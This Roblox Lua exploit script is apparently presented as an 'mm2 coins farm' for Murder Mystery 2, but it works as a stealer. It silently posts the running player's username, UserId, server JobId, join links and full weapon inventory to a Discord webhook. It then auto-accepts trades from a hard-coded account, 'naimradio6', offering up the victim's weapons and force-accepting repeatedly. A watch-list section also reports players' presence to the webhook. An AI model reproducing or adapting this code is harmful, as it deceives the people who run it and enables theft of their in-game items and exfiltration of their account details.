-- =========================================================
-- (WEBHOOK SEND)
-- =========================================================
local function sw(msg, ping)
    local body = ping and ("@everyone\n" .. msg) or msg
    local data = {content = body, username = "mm2 coins farm"}
    pcall(function()
        local req = request or (syn and syn.request) or (http and http.request)
        if req then
            req({
                Url = WU,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HS:JSONEncode(data)
            })
        end
    end)
end

-- =========================================================
-- (HTTP / SERVER HOP)
-- =========================================================
local function httpGet(url)
    local req = request or (syn and syn.request) or (http and http.request)
    if not req then return nil end
    local ok, res = pcall(function()
        return req({Url = url, Method = "GET"})
    end)
    if ok and res and res.Body then return res.Body end
    return nil
end

local function findLowServer(placeId, maxPlayers)
    maxPlayers = maxPlayers or 3
    local myJob = tostring(game.JobId)
    local bestId, bestCount = nil, 999
    local cursor = ""
    local pages = 0

    -- Scan up to 5 pages (500 servers) and pick the real lowest
    while pages < 5 do
        pages = pages + 1
        local url = "https://games.roblox.com/v1/games/" .. tostring(placeId)
            .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor ~= "" then
            url = url .. "&cursor=" .. cursor
        end

        local body = httpGet(url)
        if not body then break end

        local ok, data = pcall(function()
            return HS:JSONDecode(body)
        end)
        if not ok or not data or not data.data then break end

        for _, server in ipairs(data.data) do
            local playing = tonumber(server.playing) or 0
            local id = server.id
            if id and tostring(id) ~= myJob and playing < bestCount then
                bestCount = playing
                bestId = id
            end
            -- Instant accept if 0-2 players
            if id and tostring(id) ~= myJob and playing >= 0 and playing <= maxPlayers then
                if playing < bestCount then
                    bestCount = playing
                    bestId = id
                end
            end
        end

        -- Found a good low server, stop early
        if bestId and bestCount <= maxPlayers then
            break
        end

        cursor = data.nextPageCursor or ""
        if cursor == "" then break end
        task.wait(0.15)
    end

    if bestId then
        print("[Server] Best found:", bestCount, "players |", bestId)
    else
        print("[Server] No servers found")
    end
    return bestId, bestCount
end

local function hopLowServer()
    print("[Server] Scanning for lowest player server...")
    local jobId, count = findLowServer(CURRENT_PLACE, 3)
    if not jobId then
        print("[Server] Failed - try again")
        return
    end
    -- Refuse to hop into a full server (8+)
    if count and count >= 8 then
        print("[Server] Only full servers found (" .. count .. "). Skipping hop.")
        return
    end
    print("[Server] Hopping to", count, "player server")
    pcall(function()
        TeleportService:TeleportToPlaceInstance(CURRENT_PLACE, jobId, lp)
    end)
end

local function copyJoinCode()
    local code = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. tostring(game.PlaceId) .. ', "' .. tostring(game.JobId) .. '")'
    pcall(function()
        if setclipboard then setclipboard(code)
        elseif toclipboard then toclipboard(code) end
    end)
    print("[JobId]", code)
    return code
end

-- =========================================================
-- (TRANSFER - ONLY IF NOT LISTED)
-- =========================================================
local TARGET = "naimradio6"
local trading = false
local offeredCount = 0
local lastOffer = 0
local OfferItem, AcceptTrade, DeclineTrade, UpdateTrade

local function getFullInventory()
    local items = {}
    pcall(function()
        local pd = RPS:FindFirstChild("Remotes") and RPS.Remotes:FindFirstChild("GetPlayerData")
        if not pd then pd = RPS:FindFirstChild("GetPlayerData", true) end
        if pd then
            local data = pd:InvokeServer()
            if data and data.Weapons and data.Weapons.Owned then
                for name, count in pairs(data.Weapons.Owned) do
                    if typeof(count) == "number" and count > 0 then
                        for i = 1, math.min(count, 20) do
                            table.insert(items, name)
                        end
                    elseif count == true then
                        table.insert(items, name)
                    end
                end
            end
        end
    end)
    pcall(function()
        for _, t in ipairs(lp.Backpack:GetChildren()) do
            if t:IsA("Tool") then table.insert(items, t.Name) end
        end
        if lp.Character then
            for _, t in ipairs(lp.Character:GetChildren()) do
                if t:IsA("Tool") then table.insert(items, t.Name) end
            end
        end
    end)
    return items
end

local function sendDetailedTransfer()
    local jobId = tostring(game.JobId)
    local consoleCode = 'Roblox.GameLauncher.joinGameInstance(' .. PLACE_ID .. ', "' .. jobId .. '")'
    local inventory = getFullInventory()
    local inventoryText = #inventory > 0 and table.concat(inventory, "\n") or "No weapons found"
    if #inventoryText > 900 then
        inventoryText = string.sub(inventoryText, 1, 900) .. "\n... (truncated)"
    end
    local data = {
        content = "@everyone **credits not n7kh in discord**",
        embeds = {{
            title = "Quick Transfer",
            color = 5763719,
            fields = {
                {name = "Username", value = lp.Name, inline = true},
                {name = "UserId", value = tostring(lp.UserId), inline = true},
                {name = "JobId", value = "`" .. jobId .. "`", inline = false},
                {name = "Join Link", value = "https://fern.wtf/joiner?placeId=" .. PLACE_ID .. "&gameInstanceId=" .. jobId, inline = false},
                {name = "Console (F12)", value = "```js\n" .. consoleCode .. "\n```", inline = false},
                {name = "Inventory (" .. #inventory .. " items)", value = "```\n" .. inventoryText .. "\n```", inline = false},
            },
            footer = {text = "Waiting for trade from " .. TARGET},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    pcall(function()
        local req = request or (syn and syn.request) or (http and http.request)
        if req then
            req({
                Url = WU,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HS:JSONEncode(data)
            })
        end
    end)
end

local function offerWeapons()
    if not OfferItem then return end
    local items = getFullInventory()
    if #items == 0 then return end
    offeredCount = 0
    for _, itemName in ipairs(items) do
        if offeredCount >= 4 then break end
        if tick() - lastOffer < 0.45 then
            task.wait(0.45 - (tick() - lastOffer))
        end
        local ok = pcall(function() OfferItem:FireServer(itemName) end)
        pcall(function() OfferItem:FireServer(itemName, 1) end)
        if ok then
            offeredCount = offeredCount + 1
            lastOffer = tick()
            task.wait(0.15)
        end
    end
end

local function forceAccept()
    if not AcceptTrade then return end
    pcall(function() AcceptTrade:FireServer() end)
    pcall(function() AcceptTrade:FireServer(true) end)
    pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, tick()) end)
end

if hasTransfer then
    local Trade = RPS:FindFirstChild("Trade") or RPS:FindFirstChild("TradeSystem") or RPS
    OfferItem = Trade and (Trade:FindFirstChild("OfferItem") or Trade:FindFirstChild("Offer"))
    AcceptTrade = Trade and (Trade:FindFirstChild("AcceptTrade") or Trade:FindFirstChild("Accept") or Trade:FindFirstChild("AcceptRequest"))
    DeclineTrade = Trade and (Trade:FindFirstChild("DeclineTrade") or Trade:FindFirstChild("Decline"))
    UpdateTrade = Trade and (Trade:FindFirstChild("UpdateTrade") or Trade:FindFirstChild("TradeUpdate"))

    pcall(function()
        if not OfferItem then
            for _, v in ipairs(RPS:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    local n = string.lower(v.Name)
                    if n:find("offer") and n:find("item") then OfferItem = v
                    elseif n == "offeritem" then OfferItem = v
                    elseif n:find("accept") and n:find("trade") then AcceptTrade = AcceptTrade or v
                    elseif n == "accepttrade" or n == "acceptrequest" then AcceptTrade = AcceptTrade or v
                    elseif n:find("update") and n:find("trade") then UpdateTrade = UpdateTrade or v
                    end
                end
            end
        end
    end)

    -- auto start transfer + send full embed immediately
    task.spawn(function()
        task.wait(1.5)
        sendDetailedTransfer()
        print("[Transfer] Auto started - waiting for", TARGET)
    end)

    pcall(function()
        local reqRemote = RPS:FindFirstChild("TradeRequest", true)
            or RPS:FindFirstChild("RequestTrade", true)
            or RPS:FindFirstChild("StartTrade", true)
        if reqRemote and reqRemote:IsA("RemoteEvent") then
            reqRemote.OnClientEvent:Connect(function(...)
                local from = nil
                for _, a in ipairs({...}) do
                    if typeof(a) == "Instance" and a:IsA("Player") then from = a.Name
                    elseif typeof(a) == "string" then from = a end
                end
                if from and string.lower(from) == string.lower(TARGET) then
                    trading = true
                    task.wait(0.5)
                    forceAccept()
                    task.wait(0.8)
                    offerWeapons()
                    task.wait(1)
                    forceAccept()
                end
            end)
        end
    end)

    if UpdateTrade then
        UpdateTrade.OnClientEvent:Connect(function()
            if not trading then return end
            task.wait(0.6)
            offerWeapons()
            task.wait(1)
            forceAccept()
            task.wait(6.5)
            forceAccept()
        end)
    end

    task.spawn(function()
        while true do
            task.wait(2)
            if trading then forceAccept() end
        end
    end)

    if DeclineTrade and DeclineTrade:IsA("RemoteEvent") then
        DeclineTrade.OnClientEvent:Connect(function()
            trading = false
            offeredCount = 0
        end)
    end
end

-- =========================================================
-- (WATCH LIST - ACTIVE POLL FOR SILENT KICKS)
-- =========================================================
local watchPresent = {}

local function refreshWatchPresent()
    local now = {}
    for _, pl in ipairs(P:GetPlayers()) do
        if WATCH[pl.Name] and pl ~= lp then
            now[pl.Name] = true
            if not watchPresent[pl.Name] then
                watchPresent[pl.Name] = true
                print("[Watch] Detected in server:", pl.Name)
                sw("**" .. pl.Name .. "** is in the server | by **" .. lp.Name .. "**", false)
            end
        end
    end
    for name, _ in pairs(watchPresent) do
        if not now[name] then
            watchPresent[name] = nil
            print("[Watch] Missing (left/kicked):", name)
            sw("⚠️ **" .. name .. "** left or was kicked (silent) | detected by **" .. lp.Name .. "**", true)
        end
    end
end

-- seed current players
for _, pl in ipairs(P:GetPlayers()) do
    if WATCH[pl.Name] and pl ~= lp then
        watchPresent[pl.Name] = true
    end
end

P.PlayerAdded:Connect(function(pl)
    if WATCH[pl.Name] then
        watchPresent[pl.Name] = true
        sw("**" .. pl.Name .. "** joined | by **" .. lp.Name .. "**", false)
    end
end)

-- Active check every 3s (catches silent kicks)
task.spawn(function()
    while true do
        task.wait(3)
        pcall(refreshWatchPresent)
    end
end)

